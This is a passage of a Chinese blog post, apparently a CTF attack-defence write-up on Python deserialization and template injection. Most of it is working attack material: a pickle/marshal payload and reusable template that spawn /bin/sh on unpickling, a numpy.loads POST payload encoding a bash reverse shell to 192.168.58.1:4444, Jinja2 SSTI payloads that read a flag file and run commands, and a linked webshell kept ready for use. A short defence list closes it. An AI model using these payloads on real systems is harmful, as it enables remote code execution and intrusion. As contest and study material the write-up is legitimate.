href="#由于python可以在函数当中再导入模块和定义函数，所以我们可以将自己要执行的代码都写到一个函数里foo" class="headerlink" title="由于python可以在函数当中再导入模块和定义函数，所以我们可以将自己要执行的代码都写到一个函数里foo()"></a>由于python可以在函数当中再导入模块和定义函数，所以我们可以将自己要执行的代码都写到一个函数里foo()</h5><h4 id="示例代码：-3"><a href="#示例代码：-3" class="headerlink" title="示例代码："></a>示例代码：</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">foo</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">import</span> os</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">fib</span><span class="params">(n)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> n &lt;= <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">return</span> n</span><br><span class="line">        <span class="keyword">return</span> fib(n<span class="number">-1</span>) + fib(n<span class="number">-2</span>)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'fib(10) ='</span>, fib(<span class="number">10</span>)</span><br><span class="line">    os.system(<span class="string">'/bin/sh'</span>)</span><br><span class="line">pickle.dumps(foo.func_code)</span><br></pre></td></tr></table></figure>
+
+<h5 id="运行结果如下："><a href="#运行结果如下：" class="headerlink" title="运行结果如下："></a>运行结果如下：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Traceback (most recent call last):</span><br><span class="line">  File &quot;./pic3.py&quot;, line 12, in &lt;module&gt;</span><br><span class="line">    pickle.dumps(foo.func_code)</span><br><span class="line">  File &quot;/usr/lib/python2.7/pickle.py&quot;, line 1380, in dumps</span><br><span class="line">    Pickler(file, protocol).dump(obj)</span><br><span class="line">  File &quot;/usr/lib/python2.7/pickle.py&quot;, line 224, in dump</span><br><span class="line">    self.save(obj)</span><br><span class="line">  File &quot;/usr/lib/python2.7/pickle.py&quot;, line 306, in save</span><br><span class="line">    rv = reduce(self.proto)</span><br><span class="line">  File &quot;/usr/lib/python2.7/copy_reg.py&quot;, line 70, in _reduce_ex</span><br><span class="line">    raise TypeError, &quot;can&apos;t pickle %s objects&quot; % base.__name__</span><br><span class="line">TypeError: can&apos;t pickle code objects</span><br></pre></td></tr></table></figure>
+
+<h4 id="4-问题解决"><a href="#4-问题解决" class="headerlink" title="4.问题解决"></a>4.问题解决</h4><h5 id="但是，我们还有一个利器，自从-python-2-6-起，Python-给我们提供了一个可以序列化code对象的模块–Marshal"><a href="#但是，我们还有一个利器，自从-python-2-6-起，Python-给我们提供了一个可以序列化code对象的模块–Marshal" class="headerlink" title="但是，我们还有一个利器，自从 python 2.6 起，Python 给我们提供了一个可以序列化code对象的模块–Marshal"></a>但是，我们还有一个利器，自从 python 2.6 起，Python 给我们提供了一个可以序列化code对象的模块–Marshal</h5><h5 id="我们可以这样让这段代码序列化，同时为了显示方便，我们选择序列化后再进行-base64-处理"><a href="#我们可以这样让这段代码序列化，同时为了显示方便，我们选择序列化后再进行-base64-处理" class="headerlink" title="我们可以这样让这段代码序列化，同时为了显示方便，我们选择序列化后再进行 base64 处理"></a>我们可以这样让这段代码序列化，同时为了显示方便，我们选择序列化后再进行 base64 处理</h5><h4 id="示例代码：-4"><a href="#示例代码：-4" class="headerlink" title="示例代码："></a>示例代码：</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> marshal</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">foo</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">import</span> os</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">fib</span><span class="params">(n)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> n &lt;= <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">return</span> n</span><br><span class="line">        <span class="keyword">return</span> fib(n<span class="number">-1</span>) + fib(n<span class="number">-2</span>)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'fib(10) ='</span>, fib(<span class="number">10</span>)</span><br><span class="line">    os.system(<span class="string">'/bin/sh'</span>)</span><br><span class="line"></span><br><span class="line">code_serialized = base64.b64encode(marshal.dumps(foo.func_code))</span><br><span class="line"><span class="keyword">print</span> code_serialized</span><br></pre></td></tr></table></figure>
+
+<h4 id="运行结果如下：-1"><a href="#运行结果如下：-1" class="headerlink" title="运行结果如下："></a>运行结果如下：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">YwAAAAABAAAAAgAAAAMAAABzOwAAAGQBAGQAAGwAAH0AAIcAAGYBAGQCAIYAAIkAAGQDAEeIAABkBACDAQBHSHwAAGoBAGQFAIMBAAFkAABTKAYAAABOaf////9jAQAAAAEAAAAEAAAAEwAAAHMsAAAAfAAAZAEAawEAchAAfAAAU4gAAHwAAGQBABiDAQCIAAB8AABkAgAYgwEAF1MoAwAAAE5pAQAAAGkCAAAAKAAAAAAoAQAAAHQBAAAAbigBAAAAdAMAAABmaWIoAAAAAHMJAAAALi9waWM0LnB5UgEAAAAHAAAAcwYAAAAAAQwBBAFzCAAAAGZpYigxMCk9aQoAAABzBwAAAC9iaW4vc2goAgAAAHQCAAAAb3N0BgAAAHN5c3RlbSgBAAAAUgIAAAAoAAAAACgBAAAAUgEAAABzCQAAAC4vcGljNC5weXQDAAAAZm9vBQAAAHMIAAAAAAEMAQ8EDwE=</span><br></pre></td></tr></table></figure>
+
+<h6 id="好，现在我们需要让这段代码在反序列化的时候得到执行，那我们还能不能直接使用-reduce-呢？好像不行，因为-reduce-是利用调用某个-callable-并传递参数来执行的，而我们这个函数本身就是一个-callable-，我们需要执行它，而不是将他作为某个函数的参数，那这个时候怎么办？这时候就要利用我们上面分析的那个-PVM-操作码来自己构造了"><a href="#好，现在我们需要让这段代码在反序列化的时候得到执行，那我们还能不能直接使用-reduce-呢？好像不行，因为-reduce-是利用调用某个-callable-并传递参数来执行的，而我们这个函数本身就是一个-callable-，我们需要执行它，而不是将他作为某个函数的参数，那这个时候怎么办？这时候就要利用我们上面分析的那个-PVM-操作码来自己构造了" class="headerlink" title="好，现在我们需要让这段代码在反序列化的时候得到执行，那我们还能不能直接使用 __reduce__呢？好像不行，因为 reduce 是利用调用某个 callable 并传递参数来执行的，而我们这个函数本身就是一个 callable ，我们需要执行它，而不是将他作为某个函数的参数，那这个时候怎么办？这时候就要利用我们上面分析的那个 PVM 操作码来自己构造了"></a>好，现在我们需要让这段代码在反序列化的时候得到执行，那我们还能不能直接使用 <code>__reduce__</code>呢？好像不行，因为 reduce 是利用调用某个 callable 并传递参数来执行的，而我们这个函数本身就是一个 callable ，我们需要执行它，而不是将他作为某个函数的参数，那这个时候怎么办？这时候就要利用我们上面分析的那个 PVM 操作码来自己构造了</h6><h6 id="我们先写出来我们需要执行的东西，实际上这里也用到了-Python-的一个面向对象的特性，Python-能通过-types-FunctionTyle-func-code-globals-’’-来动态地创建匿名函数，这一部分的内容可以看官方文档的介绍"><a href="#我们先写出来我们需要执行的东西，实际上这里也用到了-Python-的一个面向对象的特性，Python-能通过-types-FunctionTyle-func-code-globals-’’-来动态地创建匿名函数，这一部分的内容可以看官方文档的介绍" class="headerlink" title="我们先写出来我们需要执行的东西，实际上这里也用到了 Python 的一个面向对象的特性，Python 能通过 types.FunctionTyle(func_code,globals(),’’)() 来动态地创建匿名函数，这一部分的内容可以看官方文档的介绍"></a>我们先写出来我们需要执行的东西，实际上这里也用到了 Python 的一个面向对象的特性，Python 能通过 types.FunctionTyle(func_code,globals(),’’)() 来动态地创建匿名函数，这一部分的内容可以看<a href="https://docs.python.org/3/library/types.html" target="_blank" rel="noopener">官方文档</a>的介绍</h6><h6 id="结合我们之前的编码操作，我们最重要执行的是"><a href="#结合我们之前的编码操作，我们最重要执行的是" class="headerlink" title="结合我们之前的编码操作，我们最重要执行的是"></a>结合我们之前的编码操作，我们最重要执行的是</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(types.FunctionType(marshal.loads(base64.b64decode(code_enc)), globals(), &apos;&apos;))()</span><br></pre></td></tr></table></figure>
+
+<h5 id="那我们现在的任务就是如何通过-PVM-操作码来构造出这个东西的执行-其实还是蛮复杂的"><a href="#那我们现在的任务就是如何通过-PVM-操作码来构造出这个东西的执行-其实还是蛮复杂的" class="headerlink" title="那我们现在的任务就是如何通过 PVM 操作码来构造出这个东西的执行(其实还是蛮复杂的)"></a>那我们现在的任务就是如何通过 PVM 操作码来构造出这个东西的执行(其实还是蛮复杂的)</h5><h5 id="这是我们直接给出的paylaod"><a href="#这是我们直接给出的paylaod" class="headerlink" title="这是我们直接给出的paylaod:"></a>这是我们直接给出的paylaod:</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">ctypes</span><br><span class="line">FunctionType</span><br><span class="line">(cmarshal</span><br><span class="line">loads</span><br><span class="line">(cbase64</span><br><span class="line">b64decode</span><br><span class="line">(S&apos;YwAAAAABAAAAAgAAAAMAAABzOwAAAGQBAGQAAGwAAH0AAIcAAGYBAGQCAIYAAIkAAGQDAEeIAABkBACDAQBHSHwAAGoBAGQFAIMBAAFkAABTKAYAAABOaf////9jAQAAAAEAAAAEAAAAEwAAAHMsAAAAfAAAZAEAawEAchAAfAAAU4gAAHwAAGQBABiDAQCIAAB8AABkAgAYgwEAF1MoAwAAAE5pAQAAAGkCAAAAKAAAAAAoAQAAAHQBAAAAbigBAAAAdAMAAABmaWIoAAAAAHMHAAAAcGljNC5weVIBAAAABwAAAHMGAAAAAAEMAQQBcwkAAABmaWIoMTApID1pCgAAAHMHAAAAL2Jpbi9zaCgCAAAAdAIAAABvc3QGAAAAc3lzdGVtKAEAAABSAgAAACgAAAAAKAEAAABSAQAAAHMHAAAAcGljNC5weXQDAAAAZm9vBQAAAHMIAAAAAAEMAQ8EDwE=&apos;</span><br><span class="line">tRtRc__builtin__</span><br><span class="line">globals</span><br><span class="line">(tRS&apos;&apos;</span><br><span class="line">tR(tR.</span><br></pre></td></tr></table></figure>
+
+<h5 id="大家有兴趣可以自己根据我之前的分析来看自己也分析一下这段代码，会对你的能力有所提升，那么为了每次构造这段代码的方便性，外国大牛给出了构造-payload-的模板，"><a href="#大家有兴趣可以自己根据我之前的分析来看自己也分析一下这段代码，会对你的能力有所提升，那么为了每次构造这段代码的方便性，外国大牛给出了构造-payload-的模板，" class="headerlink" title="大家有兴趣可以自己根据我之前的分析来看自己也分析一下这段代码，会对你的能力有所提升，那么为了每次构造这段代码的方便性，外国大牛给出了构造 payload 的模板，"></a>大家有兴趣可以自己根据我之前的分析来看自己也分析一下这段代码，会对你的能力有所提升，那么为了每次构造这段代码的方便性，外国大牛给出了构造 payload 的模板，</h5><h4 id="payload模板"><a href="#payload模板" class="headerlink" title="payload模板"></a>payload模板</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> marshal</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">foo</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">pass</span> <span class="comment"># Your code here</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"""ctypes</span></span><br><span class="line"><span class="string">FunctionType</span></span><br><span class="line"><span class="string">(cmarshal</span></span><br><span class="line"><span class="string">loads</span></span><br><span class="line"><span class="string">(cbase64</span></span><br><span class="line"><span class="string">b64decode</span></span><br><span class="line"><span class="string">(S'%s'</span></span><br><span class="line"><span class="string">tRtRc__builtin__</span></span><br><span class="line"><span class="string">globals</span></span><br><span class="line"><span class="string">(tRS''</span></span><br><span class="line"><span class="string">tR(tR."""</span> % base64.b64encode(marshal.dumps(foo.func_code))</span><br></pre></td></tr></table></figure>
+
+<h4 id="结果："><a href="#结果：" class="headerlink" title="结果："></a>结果：</h4><h5 id="我们看一下最终执行这段字符串的结果"><a href="#我们看一下最终执行这段字符串的结果" class="headerlink" title="我们看一下最终执行这段字符串的结果"></a>我们看一下最终执行这段字符串的结果</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/python_test# python2</span><br><span class="line">Python 2.7.16 (default, Apr  6 2019, 01:42:57)</span><br><span class="line">[GCC 8.3.0] on linux2</span><br><span class="line">Type &quot;help&quot;, &quot;copyright&quot;, &quot;credits&quot; or &quot;license&quot; for more information.</span><br><span class="line">&gt;&gt;&gt; import pickle</span><br><span class="line">&gt;&gt;&gt; import os</span><br><span class="line">&gt;&gt;&gt; import marshal</span><br><span class="line">&gt;&gt;&gt; pickle.load(open(&apos;pic5.txt&apos;))</span><br><span class="line">fib(10)= 55</span><br><span class="line"># ls -a</span><br><span class="line">.         pic3.py  pic5.txt           pickle_shell.py  RCE.py     unpickle.py</span><br><span class="line">..        pic4.py  pickle_payload.py  pic.py           solver.py  unpic.py</span><br><span class="line">mytcp.py  pic5.py  pickle_poc.py      poc.txt          test.py</span><br><span class="line">#</span><br></pre></td></tr></table></figure>
+
+<h5 id="不仅返回了我们-feibonaqie-数列的结果，还返回了我们的-shell"><a href="#不仅返回了我们-feibonaqie-数列的结果，还返回了我们的-shell" class="headerlink" title="不仅返回了我们 feibonaqie 数列的结果，还返回了我们的 shell"></a>不仅返回了我们 feibonaqie 数列的结果，还返回了我们的 shell</h5><h4 id="0x08-numpy反序列化-cve-2019-6446"><a href="#0x08-numpy反序列化-cve-2019-6446" class="headerlink" title="0x08 numpy反序列化(cve-2019-6446)"></a>0x08 numpy反序列化(cve-2019-6446)</h4><h5 id="我们可以全局搜到哪里调用了numpy："><a href="#我们可以全局搜到哪里调用了numpy：" class="headerlink" title="我们可以全局搜到哪里调用了numpy："></a>我们可以全局搜到哪里调用了numpy：</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route('/getvdot', methods=['POST', 'GET'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getvdot</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">'GET'</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">'getvdot.html'</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        matrix1 = base64.b64decode(request.form[<span class="string">'matrix1'</span>])</span><br><span class="line">        matrix2 = base64.b64decode(request.form[<span class="string">'matrix2'</span>])</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            matrix1 = numpy.loads(matrix1)</span><br><span class="line">            matrix2 = numpy.loads(matrix2)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            print(e)</span><br><span class="line">        result = numpy.vdot(matrix1, matrix2)</span><br><span class="line">        print(result)</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">'getvdot.html'</span>, msg=result, status=<span class="string">'向量点积'</span>)</span><br></pre></td></tr></table></figure>
+
+<h5 id="因为numpy的loads方法调用的也是pickle-因此pickle的payload还是可以用"><a href="#因为numpy的loads方法调用的也是pickle-因此pickle的payload还是可以用" class="headerlink" title="因为numpy的loads方法调用的也是pickle,因此pickle的payload还是可以用."></a>因为numpy的loads方法调用的也是pickle,因此pickle的payload还是可以用.</h5><h5 id="payload-post提交："><a href="#payload-post提交：" class="headerlink" title="payload:post提交："></a>payload:post提交：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">matrix1=Y3Bvc2l4CnN5c3RlbQpwMQooUyJiYXNoIC1jICdiYXNoIC1pID4vZGV2L3RjcC8xOTIuMTY4LjU4LjEvNDQ0NCAwPiYxJyIKcDIKdHAzClJwNAou&amp;matrix2=MQ==</span><br></pre></td></tr></table></figure>
+
+<h5 id="同样会报错-但是能成功反弹shell"><a href="#同样会报错-但是能成功反弹shell" class="headerlink" title="同样会报错,但是能成功反弹shell."></a>同样会报错,但是能成功反弹shell.</h5><h4 id="0x09-Jinja2-from-string-SSTI"><a href="#0x09-Jinja2-from-string-SSTI" class="headerlink" title="0x09 Jinja2.from_string SSTI"></a>0x09 Jinja2.from_string SSTI</h4><h5 id="这个也是今年的新漏洞"><a href="#这个也是今年的新漏洞" class="headerlink" title="这个也是今年的新漏洞"></a>这个也是今年的新漏洞</h5><h5 id="https-www-exploit-db-com-exploits-46386"><a href="#https-www-exploit-db-com-exploits-46386" class="headerlink" title="https://www.exploit-db.com/exploits/46386"></a><a href="https://www.exploit-db.com/exploits/46386" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/46386</a></h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route('/hello',methods=['GET', 'POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hello</span><span class="params">()</span>:</span></span><br><span class="line">    username = request.cookies.get(<span class="string">'username'</span>)</span><br><span class="line">    username = str(base64.b64decode(username), encoding = <span class="string">"utf-8"</span>)</span><br><span class="line">    data = Jinja2.from_string(<span class="string">"Hello , "</span> + username + <span class="string">'!'</span>).render()</span><br><span class="line">    is_value = <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">'hello.html'</span>, msg=data,is_value=is_value)</span><br></pre></td></tr></table></figure>
+
+<h5 id="在data处使用了Jinja2-from-string直接拼接字符串-存在ssti。"><a href="#在data处使用了Jinja2-from-string直接拼接字符串-存在ssti。" class="headerlink" title="在data处使用了Jinja2.from_string直接拼接字符串,存在ssti。"></a>在data处使用了Jinja2.from_string直接拼接字符串,存在ssti。</h5><h5 id="poc需要base64编码填入在cookie的username字段，还有因为是python3有些payload不能使用。"><a href="#poc需要base64编码填入在cookie的username字段，还有因为是python3有些payload不能使用。" class="headerlink" title="poc需要base64编码填入在cookie的username字段，还有因为是python3有些payload不能使用。"></a>poc需要base64编码填入在cookie的username字段，还有因为是python3有些payload不能使用。</h5><h5 id="读flag"><a href="#读flag" class="headerlink" title="读flag:"></a>读flag:</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="keyword">for</span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">&#123;% <span class="keyword">if</span> c.__name__==<span class="string">'catch_warnings'</span> %&#125;</span><br><span class="line">&#123;&#123; c.__init__.__globals__[<span class="string">'__builtins__'</span>].open(<span class="string">'\\flag'</span>, <span class="string">'r'</span>).read() &#125;&#125;</span><br><span class="line">&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>
+
+<h5 id="执行命令："><a href="#执行命令：" class="headerlink" title="执行命令："></a>执行命令：</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="keyword">for</span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">&#123;% <span class="keyword">if</span> c.__name__==<span class="string">'catch_warnings'</span> %&#125;</span><br><span class="line">&#123;&#123;c.__init__.__globals__[<span class="string">'__builtins__'</span>].eval(<span class="string">"__import__('os').popen('whoami').read()"</span>) &#125;&#125;</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="flask日志记录"><a href="#flask日志记录" class="headerlink" title="flask日志记录"></a>flask日志记录</h4><h5 id="flask本身的日志功能并不能满足需求，因此写了一个："><a href="#flask本身的日志功能并不能满足需求，因此写了一个：" class="headerlink" title="flask本身的日志功能并不能满足需求，因此写了一个："></a>flask本身的日志功能并不能满足需求，因此写了一个：</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">awdlog</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">import</span> time</span><br><span class="line">    f = open(<span class="string">'/tmp/log.txt'</span>,<span class="string">'a+'</span>)</span><br><span class="line">    f.writelines(time.strftime(<span class="string">'%Y-%m-%d %H:%M:%S\n'</span>, time.localtime(time.time())))</span><br><span class="line">    f.writelines(<span class="string">"&#123;method&#125; &#123;url&#125; \n"</span>.format(method=request.method,url=request.url))</span><br><span class="line">    s = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> d,v <span class="keyword">in</span> dict(request.headers).items():</span><br><span class="line">        s += <span class="string">"%s: %s\n"</span>%(d,v)</span><br><span class="line">    f.writelines(s+<span class="string">'\n'</span>)</span><br><span class="line">    s = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> d,v <span class="keyword">in</span> dict(request.form).items():</span><br><span class="line">        s += <span class="string">"%s=%s&amp;"</span>%(d,v)</span><br><span class="line">    f.writelines(s.strip(<span class="string">"&amp;"</span>))</span><br><span class="line">    f.writelines(<span class="string">'\n\n'</span>)</span><br><span class="line">    f.close()</span><br></pre></td></tr></table></figure>
+
+<h5 id="因为python这题check比较严格-上了waf一直被checkdown-所以没写waf-不过和php的道理是一样的"><a href="#因为python这题check比较严格-上了waf一直被checkdown-所以没写waf-不过和php的道理是一样的" class="headerlink" title="因为python这题check比较严格,上了waf一直被checkdown,所以没写waf.不过和php的道理是一样的."></a>因为python这题check比较严格,上了waf一直被checkdown,所以没写waf.不过和php的道理是一样的.</h5><h6 id="python-webshell"><a href="#python-webshell" class="headerlink" title="python webshell"></a>python webshell</h6><h6 id="比赛中虽然没用上-可以准备着-万一哪次就用到了"><a href="#比赛中虽然没用上-可以准备着-万一哪次就用到了" class="headerlink" title="比赛中虽然没用上,可以准备着,万一哪次就用到了."></a>比赛中虽然没用上,可以准备着,万一哪次就用到了.</h6><h5 id="https-github-com-evilcos-python-webshell-blob-master-webllehs-py"><a href="#https-github-com-evilcos-python-webshell-blob-master-webllehs-py" class="headerlink" title="https://github.com/evilcos/python-webshell/blob/master/webllehs.py"></a><a href="https://github.com/evilcos/python-webshell/blob/master/webllehs.py" target="_blank" rel="noopener">https://github.com/evilcos/python-webshell/blob/master/webllehs.py</a></h5><h4 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h4><h6 id="java题-writeup-一叶飘零师傅写的2019-OGeek-Final-amp-Java-Web"><a href="#java题-writeup-一叶飘零师傅写的2019-OGeek-Final-amp-Java-Web" class="headerlink" title="java题 writeup : 一叶飘零师傅写的2019 OGeek Final &amp; Java Web"></a>java题 writeup : <a href="https://www.4hou.com/web/20619.html" target="_blank" rel="noopener">一叶飘零师傅写的2019 OGeek Final &amp; Java Web</a></h6><h6 id="php题writeup-xmsec师傅写的ogeek-ozero-wp"><a href="#php题writeup-xmsec师傅写的ogeek-ozero-wp" class="headerlink" title="php题writeup: xmsec师傅写的ogeek-ozero-wp"></a>php题writeup: <a href="https://www.4hou.com/web/20619.html" target="_blank" rel="noopener">xmsec师傅写的ogeek-ozero-wp</a></h6><h5 id="上面这部分内容如果想看详细的解释，可以参考-文章一-和-文章二"><a href="#上面这部分内容如果想看详细的解释，可以参考-文章一-和-文章二" class="headerlink" title="上面这部分内容如果想看详细的解释，可以参考 文章一 和 文章二"></a>上面这部分内容如果想看详细的解释，可以参考 <a href="https://checkoway.net/musings/pickle/" target="_blank" rel="noopener">文章一</a> 和 <a href="http://www.polaris-lab.com/index.php/archives/178/" target="_blank" rel="noopener">文章二</a></h5><h4 id="0x08-Python-反序列化漏洞如何防御"><a href="#0x08-Python-反序列化漏洞如何防御" class="headerlink" title="0x08 Python 反序列化漏洞如何防御"></a>0x08 Python 反序列化漏洞如何防御</h4><h5 id="1-不要再不守信任的通道中传递-pcikle-序列化对象"><a href="#1-不要再不守信任的通道中传递-pcikle-序列化对象" class="headerlink" title="(1) 不要再不守信任的通道中传递 pcikle 序列化对象"></a>(1) 不要再不守信任的通道中传递 pcikle 序列化对象</h5><h5 id="2-在传递序列化对象前请进行签名或者加密，防止篡改和重播"><a href="#2-在传递序列化对象前请进行签名或者加密，防止篡改和重播" class="headerlink" title="(2) 在传递序列化对象前请进行签名或者加密，防止篡改和重播"></a>(2) 在传递序列化对象前请进行签名或者加密，防止篡改和重播</h5><h5 id="3-如果序列化数据存储在磁盘上，请确保不受信任的第三方不能修改、覆盖或者重新创建自己的序列化数据"><a href="#3-如果序列化数据存储在磁盘上，请确保不受信任的第三方不能修改、覆盖或者重新创建自己的序列化数据" class="headerlink" title="(3) 如果序列化数据存储在磁盘上，请确保不受信任的第三方不能修改、覆盖或者重新创建自己的序列化数据"></a>(3) 如果序列化数据存储在磁盘上，请确保不受信任的第三方不能修改、覆盖或者重新创建自己的序列化数据</h5><h5 id="4-将-pickle-加载的数据列入白名单"><a href="#4-将-pickle-加载的数据列入白名单" class="headerlink" title="(4) 将 pickle 加载的数据列入白名单"></a>(4) 将 pickle 加载的数据列入白名单</h5><h4 id="0X09-参考"><a href="#0X09-参考" class="headerlink" title="0X09 参考"></a>0X09 参考</h4><h5 id="https-checkoway-net-musings-pickle"><a href="#https-checkoway-net-musings-pickle" class="headerlink" title="https://checkoway.net/musings/pickle/"></a><a href="https://checkoway.net/musings/pickle/" target="_blank" rel="noopener">https://checkoway.net/musings/pickle/</a></h5><h5 id="http-bendawang-site-2018-03-01-E5-85-B3-E4-BA-8EPython-sec-E7-9A-84-E4-B8-80-E4-BA-9B-E6-80-BB-E7-BB-93"><a href="#http-bendawang-site-2018-03-01-E5-85-B3-E4-BA-8EPython-sec-E7-9A-84-E4-B8-80-E4-BA-9B-E6-80-BB-E7-BB-93" class="headerlink" title="http://bendawang.site/2018/03/01/%E5%85%B3%E4%BA%8EPython-sec%E7%9A%84%E4%B8%80%E4%BA%9B%E6%80%BB%E7%BB%93/"></a><a href="http://bendawang.site/2018/03/01/%E5%85%B3%E4%BA%8EPython-sec%E7%9A%84%E4%B8%80%E4%BA%9B%E6%80%BB%E7%BB%93/" target="_blank" rel="noopener">http://bendawang.site/2018/03/01/%E5%85%B3%E4%BA%8EPython-sec%E7%9A%84%E4%B8%80%E4%BA%9B%E6%80%BB%E7%BB%93/</a></h5><h5 id="http-www-bendawang-site-2017-03-21-python-E6-B7-B1-E5-85-A5-E5-AD-A6-E4-B9-A0-E4-B8-80-EF-BC-9A-E7-B1-BB-E4-B8-8E-E5-85-83-E7-B1-BB-EF-BC-88metaclass-EF-BC-89-E7-9A-84-E7-90-86-E8-A7-A3"><a 